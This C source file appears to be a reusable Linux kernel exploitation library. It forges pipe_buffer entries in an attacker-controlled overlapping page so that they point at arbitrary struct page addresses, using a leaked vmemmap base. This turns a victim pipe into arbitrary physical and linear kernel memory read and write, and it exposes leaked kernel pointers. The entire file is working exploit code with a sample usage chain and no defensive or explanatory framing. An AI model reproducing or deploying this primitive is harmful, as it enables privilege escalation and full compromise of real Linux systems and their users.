#define _GNU_SOURCE
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define PIPE_BUFFER_PAGE_SIZE 0x1000U
#define PIPE_BUFFER_ENTRY_SIZE 40U
#define PIPE_BUFFER_DEFAULT_STRUCT_PAGE_SIZE 64U

typedef ssize_t (*pipe_buffer_page_read_fn)(void *opaque, void *buf, size_t len);
typedef ssize_t (*pipe_buffer_page_write_fn)(void *opaque, const void *buf, size_t len);

typedef struct {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint64_t flags;
    uint64_t private_data;
} pipe_buffer_entry_t;

_Static_assert(sizeof(pipe_buffer_entry_t) == PIPE_BUFFER_ENTRY_SIZE,
               "pipe_buffer_entry_t must match the 40-byte layout");

typedef struct {
    int victim_pipe[2];
    pipe_buffer_page_read_fn read_overlap_page;
    pipe_buffer_page_write_fn write_overlap_page;
    void *overlap_page_opaque;
    size_t target_offset;
    size_t copy_count;
    size_t struct_page_size;
    uint64_t vmemmap_base;
    uint64_t linear_base;
    bool template_valid;
    pipe_buffer_entry_t template;
    uint8_t scratch_page[PIPE_BUFFER_PAGE_SIZE];
} pipe_buffer_rw_ctx_t;

/*
 * Sample usage:
 *
 *   pipe_buffer_rw_ctx_t ctx;
 *   init_pipe_buffer_rw(&ctx, pipefd[0], pipefd[1],
 *                       overlap_read_page, overlap_write_page, opaque,
 *                       target_offset, 4);
 *   execute_pipe_buffer_capture_template(&ctx);
 *   execute_pipe_buffer_set_vmemmap_base_from_leak(&ctx, 0xfffffffff0000000ULL);
 *   execute_pipe_buffer_set_linear_base(&ctx, leaked_linear_base);
 *   execute_pipe_buffer_read_linear(&ctx, target_addr, buf, sizeof(buf));
 */

static size_t pipe_buffer_max_copy_count(size_t target_offset) {
    return (PIPE_BUFFER_PAGE_SIZE - target_offset) / sizeof(pipe_buffer_entry_t);
}

size_t pipe_buffer_array_allocation_size(unsigned int order) {
    return PIPE_BUFFER_ENTRY_SIZE * (1U << order);
}

static int pipe_buffer_read_overlap_page(pipe_buffer_rw_ctx_t *ctx) {
    ssize_t ret;

    if (!ctx || !ctx->read_overlap_page) {
        return -EINVAL;
    }

    ret = ctx->read_overlap_page(ctx->overlap_page_opaque, ctx->scratch_page,
                                 sizeof(ctx->scratch_page));
    if (ret != (ssize_t)sizeof(ctx->scratch_page)) {
        return -EIO;
    }

    return 0;
}

static int pipe_buffer_write_overlap_page(pipe_buffer_rw_ctx_t *ctx) {
    ssize_t ret;

    if (!ctx || !ctx->write_overlap_page) {
        return -EINVAL;
    }

    ret = ctx->write_overlap_page(ctx->overlap_page_opaque, ctx->scratch_page,
                                  sizeof(ctx->scratch_page));
    if (ret != (ssize_t)sizeof(ctx->scratch_page)) {
        return -EIO;
    }

    return 0;
}

static uint64_t pipe_buffer_phys_to_struct_page(const pipe_buffer_rw_ctx_t *ctx,
                                                uint64_t phys_addr) {
    return ((phys_addr >> 12) * ctx->struct_page_size) + ctx->vmemmap_base;
}

static int pipe_buffer_prepare_target(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
                                      uint32_t len) {
    pipe_buffer_entry_t forged;
    size_t i;
    int ret;

    if (!ctx || !ctx->template_valid) {
        return -EINVAL;
    }
    if (!ctx->vmemmap_base) {
        return -EINVAL;
    }

    ret = pipe_buffer_read_overlap_page(ctx);
    if (ret < 0) {
        return ret;
    }

    forged = ctx->template;
    forged.page = pipe_buffer_phys_to_struct_page(ctx, phys_addr);
    forged.offset = (uint32_t)(phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
    forged.len = len;

    for (i = 0; i < ctx->copy_count; i++) {
        size_t entry_offset = ctx->target_offset + (i * sizeof(pipe_buffer_entry_t));
        memcpy(ctx->scratch_page + entry_offset, &forged, sizeof(forged));
    }

    return pipe_buffer_write_overlap_page(ctx);
}

int init_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx, int victim_pipe_read,
                        int victim_pipe_write,
                        pipe_buffer_page_read_fn read_overlap_page,
                        pipe_buffer_page_write_fn write_overlap_page,
                        void *overlap_page_opaque, size_t target_offset,
                        size_t copy_count) {
    if (!ctx || !read_overlap_page || !write_overlap_page) {
        return -EINVAL;
    }
    if (target_offset + sizeof(pipe_buffer_entry_t) > PIPE_BUFFER_PAGE_SIZE) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->victim_pipe[0] = victim_pipe_read;
    ctx->victim_pipe[1] = victim_pipe_write;
    ctx->read_overlap_page = read_overlap_page;
    ctx->write_overlap_page = write_overlap_page;
    ctx->overlap_page_opaque = overlap_page_opaque;
    ctx->target_offset = target_offset;
    ctx->copy_count = copy_count ? copy_count : 1;
    ctx->struct_page_size = PIPE_BUFFER_DEFAULT_STRUCT_PAGE_SIZE;

    if (ctx->copy_count > pipe_buffer_max_copy_count(target_offset)) {
        return -EINVAL;
    }

    return 0;
}

int execute_pipe_buffer_capture_template(pipe_buffer_rw_ctx_t *ctx) {
    int ret;

    if (!ctx) {
        return -EINVAL;
    }

    ret = pipe_buffer_read_overlap_page(ctx);
    if (ret < 0) {
        return ret;
    }

    memcpy(&ctx->template, ctx->scratch_page + ctx->target_offset,
           sizeof(ctx->template));
    ctx->template_valid = true;
    return 0;
}

void execute_pipe_buffer_set_struct_page_size(pipe_buffer_rw_ctx_t *ctx,
                                              size_t struct_page_size) {
    if (!ctx || !struct_page_size) {
        return;
    }

    ctx->struct_page_size = struct_page_size;
}

void execute_pipe_buffer_set_vmemmap_base(pipe_buffer_rw_ctx_t *ctx,
                                          uint64_t vmemmap_base) {
    if (!ctx) {
        return;
    }

    ctx->vmemmap_base = vmemmap_base;
}

int execute_pipe_buffer_set_vmemmap_base_from_leak(pipe_buffer_rw_ctx_t *ctx,
                                                   uint64_t region_mask) {
    if (!ctx || !ctx->template_valid || !region_mask) {
        return -EINVAL;
    }

    ctx->vmemmap_base = ctx->template.page & region_mask;
    return 0;
}

void execute_pipe_buffer_set_linear_base(pipe_buffer_rw_ctx_t *ctx,
                                         uint64_t linear_base) {
    if (!ctx) {
        return;
    }

    ctx->linear_base = linear_base;
}

uint64_t execute_pipe_buffer_leaked_page(const pipe_buffer_rw_ctx_t *ctx) {
    return ctx ? ctx->template.page : 0;
}

uint64_t execute_pipe_buffer_leaked_ops(const pipe_buffer_rw_ctx_t *ctx) {
    return ctx ? ctx->template.ops : 0;
}

ssize_t execute_pipe_buffer_read_phys(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
                                      void *buf, size_t count) {
    uint8_t *cursor = buf;
    size_t remaining = count;

    if (!ctx || !buf) {
        return -EINVAL;
    }

    while (remaining > 0) {
        size_t chunk = PIPE_BUFFER_PAGE_SIZE - (phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
        int ret;

        if (chunk > remaining) {
            chunk = remaining;
        }

        ret = pipe_buffer_prepare_target(ctx, phys_addr, (uint32_t)chunk);
        if (ret < 0) {
            return ret;
        }

        if (read(ctx->victim_pipe[0], cursor, chunk) != (ssize_t)chunk) {
            return -EIO;
        }

        phys_addr += chunk;
        cursor += chunk;
        remaining -= chunk;
    }

    return (ssize_t)count;
}

ssize_t execute_pipe_buffer_write_phys(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
                                       const void *buf, size_t count) {
    const uint8_t *cursor = buf;
    size_t remaining = count;

    if (!ctx || !buf) {
        return -EINVAL;
    }

    while (remaining > 0) {
        size_t chunk = PIPE_BUFFER_PAGE_SIZE - (phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
        int ret;

        if (chunk > remaining) {
            chunk = remaining;
        }

        ret = pipe_buffer_prepare_target(ctx, phys_addr, 0);
        if (ret < 0) {
            return ret;
        }

        if (write(ctx->victim_pipe[1], cursor, chunk) != (ssize_t)chunk) {
            return -EIO;
        }

        phys_addr += chunk;
        cursor += chunk;
        remaining -= chunk;
    }

    return (ssize_t)count;
}

ssize_t execute_pipe_buffer_read_linear(pipe_buffer_rw_ctx_t *ctx,
                                        uint64_t linear_addr, void *buf,
                                        size_t count) {
    if (!ctx || !ctx->linear_base || linear_addr < ctx->linear_base) {
        return -EINVAL;
    }

    return execute_pipe_buffer_read_phys(ctx, linear_addr - ctx->linear_base, buf,
                                         count);
}

ssize_t execute_pipe_buffer_write_linear(pipe_buffer_rw_ctx_t *ctx,
                                         uint64_t linear_addr, const void *buf,
                                         size_t count) {
    if (!ctx || !ctx->linear_base || linear_addr < ctx->linear_base) {
        return -EINVAL;
    }

    return execute_pipe_buffer_write_phys(ctx, linear_addr - ctx->linear_base,
                                          buf, count);
}

void cleanup_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx) {
    if (!ctx) {
        return;
    }

    memset(ctx, 0, sizeof(*ctx));
}
